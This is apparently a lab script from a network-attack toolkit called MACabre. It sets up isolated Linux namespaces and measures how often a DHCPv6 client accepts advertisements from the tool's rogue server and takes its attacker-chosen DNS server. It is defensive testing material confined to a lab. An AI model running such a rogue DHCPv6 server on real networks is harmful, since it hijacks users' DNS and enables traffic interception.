#!/usr/bin/env bash
# Isolated rogue DHCPv6 server lab (Linux only, needs root).
#
# Topology: one bridge (the LAN) with three hosts attached:
#
#   server:   dnsmasq, the legitimate DHCPv6 server (2001:db8::1/64). It hands out
#             addresses from 2001:db8::100-1ff and DNS server 2001:db8::53.
#   attacker: MACabre's rogue DHCPv6 server (link-local fe80::666), offering
#             2001:db8::200 and DNS server 2001:db8:bad::53, with preference 255.
#   client:   a DHCPv6 client. It sends SOLICIT and records the first ADVERTISE it
#             receives: the server it came from and the DNS servers it carries.
#
#   Phase 1 (baseline): only the legitimate server runs. Every first ADVERTISE comes from it.
#   Phase 2 (race): both servers run. The lab counts the rounds in which the first
#            ADVERTISE came from the rogue.
#   Phase 3 (alone): the legitimate server is stopped and the rogue runs. The lab counts
#            the rounds in which the client's first ADVERTISE carries the rogue's DNS server.
#
# The client takes the first ADVERTISE, which RFC 8415 clients may do. The race is decided
# by timing on this host, so the counts describe this lab, not a rate for real networks.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/rogue_dhcpv6_server_lab.sh
#   sudo ROUNDS=10 scripts/lab/rogue_dhcpv6_server_lab.sh
#
# Requirements: iproute2, dnsmasq, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip dnsmasq; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
ROUNDS="${ROUNDS:-5}"
ATTACK_SECONDS=30
CLIENT_MAC="02:00:00:00:00:50"
LEGIT_MAC="02:00:00:00:00:10"
ROGUE_MAC="02:00:00:00:00:60"
ROGUE_LL="fe80::666"
ROGUE_OFFER="2001:db8::200"
ROGUE_DNS="2001:db8:bad::53"
LEGIT_DNS="2001:db8::53"
WORK="$(mktemp -d)"
LOG="$WORK/dnsmasq.log"

stop_lab() {
    for pid in $(ip netns pids server 2>/dev/null || true); do
        kill "$pid" 2>/dev/null || true
    done
    for ns in client attacker server lan; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add lan
ip netns add server
ip netns add attacker
ip netns add client

# Each host has a veth to a port of the LAN bridge.
for pair in "srv:server" "att:attacker" "cli:client"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
for name in srv att cli; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done

ip netns exec server ip link set h-srv address "$LEGIT_MAC"
ip netns exec server ip link set h-srv up
ip netns exec server ip -6 addr add 2001:db8::1/64 dev h-srv nodad
ip netns exec attacker ip link set h-att address "$ROGUE_MAC"
ip netns exec attacker ip link set h-att up
ip netns exec attacker ip -6 addr add "$ROGUE_LL/64" dev h-att nodad
ip netns exec client ip link set h-cli address "$CLIENT_MAC"
ip netns exec client ip link set h-cli up
sleep 3

ip netns exec server dnsmasq \
    --keep-in-foreground \
    --interface=h-srv \
    --bind-interfaces \
    --port=0 \
    --conf-file=/dev/null \
    --dhcp-range=2001:db8::100,2001:db8::1ff,64,12h \
    --dhcp-option=option6:dns-server,"[$LEGIT_DNS]" \
    --dhcp-leasefile="$WORK/leases6" \
    --log-dhcp \
    --log-facility="$LOG" &
sleep 2

ROGUE_CODE='
import os, threading
from macabre.attacks.rogue_dhcpv6_server import RogueDhcpv6Config, run_rogue_dhcpv6
stop = threading.Event()
threading.Timer(float(os.environ["ATTACK_SECONDS"]), stop.set).start()
config = RogueDhcpv6Config(
    iface="h-att",
    server_mac=os.environ["ROGUE_MAC"],
    server_ll=os.environ["ROGUE_LL"],
    offer_ip6=os.environ["ROGUE_OFFER"],
    dns=os.environ["ROGUE_DNS"],
    preference=255,
)
stats = run_rogue_dhcpv6(config, stop, lambda _: None)
print(f"Rogue: sent {stats.advertises} advertises and {stats.replies} replies")
'

# A client that sends SOLICIT and reports the first ADVERTISE it receives for each round.
CLIENT_CODE='
import os, random, time
from scapy.all import AsyncSniffer, sendp, Ether, IPv6, UDP
from scapy.layers.dhcp6 import (
    DHCP6_Solicit, DHCP6_Advertise, DHCP6OptClientId, DHCP6OptIA_NA,
    DHCP6OptOptReq, DHCP6OptElapsedTime, DHCP6OptServerId, DHCP6OptDNSServers, DUID_LLT,
)

MAC = os.environ["CLIENT_MAC"]
LL = os.environ["CLIENT_LL"]
ROGUE_MAC = os.environ["ROGUE_MAC"]
ROGUE_DNS = os.environ["ROGUE_DNS"]
ROUNDS = int(os.environ["ROUNDS"])
rng = random.Random()
seen = []

def on_packet(pkt):
    if pkt.haslayer(DHCP6_Advertise):
        seen.append(pkt)

sniffer = AsyncSniffer(iface="h-cli", store=False, prn=on_packet)
sniffer.start()
time.sleep(0.5)
rogue_first = 0
rogue_dns = 0
for n in range(1, ROUNDS + 1):
    trid = rng.getrandbits(24)
    seen.clear()
    solicit = (
        Ether(src=MAC, dst="33:33:00:01:00:02")
        / IPv6(src=LL, dst="ff02::1:2")
        / UDP(sport=546, dport=547)
        / DHCP6_Solicit(trid=trid)
        / DHCP6OptClientId(duid=DUID_LLT(lladdr=MAC, timeval=0))
        / DHCP6OptIA_NA(iaid=1)
        / DHCP6OptOptReq(reqopts=[23])
        / DHCP6OptElapsedTime()
    )
    sendp(solicit, iface="h-cli", verbose=False)
    time.sleep(1.5)
    adverts = [p for p in seen if p[DHCP6_Advertise].trid == trid]
    if not adverts:
        print(f"round {n}: no advertise")
        continue
    first = adverts[0]
    server = first[DHCP6OptServerId].duid.lladdr
    if first.haslayer(DHCP6OptDNSServers):
        dns = ",".join(first[DHCP6OptDNSServers].dnsservers)
    else:
        dns = "none"
    if server == ROGUE_MAC:
        rogue_first += 1
    if ROGUE_DNS in dns.split(","):
        rogue_dns += 1
    print(f"round {n}: first advertise from {server} (dns {dns})")
sniffer.stop()
print(f"Client: first advertise from the rogue in {rogue_first} of {ROUNDS} rounds; rogue DNS in {rogue_dns} of {ROUNDS}")
'

run_client() {
    local ll
    ll="$(ip netns exec client ip -6 -o addr show dev h-cli scope link | awk '{print $4}' | cut -d/ -f1 | head -n 1)"
    ip netns exec client env PYTHONPATH="$ROOT/src" CLIENT_MAC="$CLIENT_MAC" CLIENT_LL="$ll" \
        ROGUE_MAC="$ROGUE_MAC" ROGUE_DNS="$ROGUE_DNS" ROUNDS="$ROUNDS" "$PY" -c "$CLIENT_CODE"
}

run_rogue() {
    ip netns exec attacker env PYTHONPATH="$ROOT/src" ATTACK_SECONDS="$ATTACK_SECONDS" \
        ROGUE_MAC="$ROGUE_MAC" ROGUE_LL="$ROGUE_LL" ROGUE_OFFER="$ROGUE_OFFER" ROGUE_DNS="$ROGUE_DNS" \
        "$PY" -c "$ROGUE_CODE"
}

echo "Phase 1: baseline, legitimate server only ($ROUNDS rounds)"
run_client | tee "$WORK/baseline.txt"
echo

echo "Phase 2: rogue and legitimate server both running for ${ATTACK_SECONDS}s ($ROUNDS rounds)"
run_rogue &
ROGUE_PID=$!
sleep 2
run_client | tee "$WORK/race.txt"
wait "$ROGUE_PID"
echo

echo "Phase 3: legitimate server stopped, rogue running for ${ATTACK_SECONDS}s ($ROUNDS rounds)"
for pid in $(ip netns pids server 2>/dev/null || true); do
    kill "$pid" 2>/dev/null || true
done
sleep 2
run_rogue &
ROGUE_PID=$!
sleep 2
run_client | tee "$WORK/alone.txt"
wait "$ROGUE_PID"
echo

BASE_ROGUE="$(grep -c "from $ROGUE_MAC" "$WORK/baseline.txt" || true)"
RACE_ROGUE="$(grep -c "from $ROGUE_MAC" "$WORK/race.txt" || true)"
ALONE_ROGUE="$(grep -c "from $ROGUE_MAC" "$WORK/alone.txt" || true)"
ALONE_DNS="$(grep -c "from $ROGUE_MAC (dns .*$ROGUE_DNS" "$WORK/alone.txt" || true)"

if (( BASE_ROGUE == 0 )); then
    echo "Baseline: every first advertise came from the legitimate server (DNS $LEGIT_DNS). OK"
else
    echo "Baseline: $BASE_ROGUE first advertises came from the rogue before the attack. Result unreliable."
fi
echo "Race: with both servers running, the client's first advertise came from the rogue in $RACE_ROGUE of $ROUNDS rounds."
if (( ALONE_DNS > 0 )); then
    echo "Alone: with the legitimate server stopped, the client's first advertise came from the rogue in $ALONE_ROGUE of $ROUNDS rounds, and carried the rogue DNS server $ROGUE_DNS in $ALONE_DNS. Vulnerable."
else
    echo "Alone: the client never took its DNS server from the rogue. Result unreliable."
fi
